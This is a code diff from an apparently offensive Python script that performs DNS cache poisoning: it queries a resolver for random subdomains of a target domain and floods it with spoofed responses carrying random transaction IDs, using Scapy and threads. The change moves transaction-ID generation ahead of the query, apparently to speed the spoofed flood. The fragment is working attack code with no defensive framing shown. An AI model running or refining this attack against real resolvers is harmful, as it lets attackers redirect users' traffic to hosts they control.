@@ -27,11 +27,11 @@ def run_attack(resolver_ip, attacker_ip, real_ns_ip, target_domain, num_requests
         specific_subdomain = str(random.randint(10000, 99999)) + "." + target_domain
         print(f"[*]   Request #{request_num + 1}: Using subdomain {specific_subdomain}")
         
+        txn_ids = random.sample(range(1, 65536), num_responses) 
+        
         # Send query for this specific subdomain
         query_packet = IP(dst=resolver_ip) / UDP() / DNS(rd=1, qd=DNSQR(qname=specific_subdomain))
         send(query_packet, verbose=0)
-
-        txn_ids = random.sample(range(1, 65536), num_responses) 
 
         # --- Multithreaded Flood ---
         print(f"[*]   Flooding with {num_responses} spoofed responses using threads...")
